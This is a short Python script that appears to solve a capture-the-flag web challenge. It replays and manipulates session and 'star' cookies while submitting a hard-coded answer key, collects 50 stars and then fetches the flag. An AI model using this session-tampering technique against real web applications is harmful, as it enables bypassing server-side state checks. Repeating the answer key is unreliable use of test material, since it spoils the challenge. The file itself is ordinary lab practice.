import requests
import sys
if len(sys.argv) != 2:
	print('Usage: solution.py <challenge-url>')
# Variables 
url = sys.argv[1]
answerKey = ['planet','passport','game','rabbit','secrets']
starCount = 0
star = "5f2b5e62b65230eb7fe1856556bad37ed661f299a791df5acad939d4b35a7835"
with requests.Session() as s:
	# Initial set-up
	s.get(url + '/start')
	s.get(url + '/home')
	cookies = s.cookies.get_dict()
	sessionVal = cookies['session']
	while starCount < 50:
		for i, value in enumerate(answerKey):
			newCookies = {'session':sessionVal,'star':star}
			r = s.get(url + '/check-answer?answer=' + answerKey[i],cookies=newCookies)
			cookies = s.cookies.get_dict()
			if i == 4:
				sessionVal = ''
			else:
				star = cookies['star']
				sessionVal = cookies['session']
				starCount += 1 
			if starCount == 50:
		 		break
	r = s.get(url + '/flag',cookies=newCookies)
	print(r.content)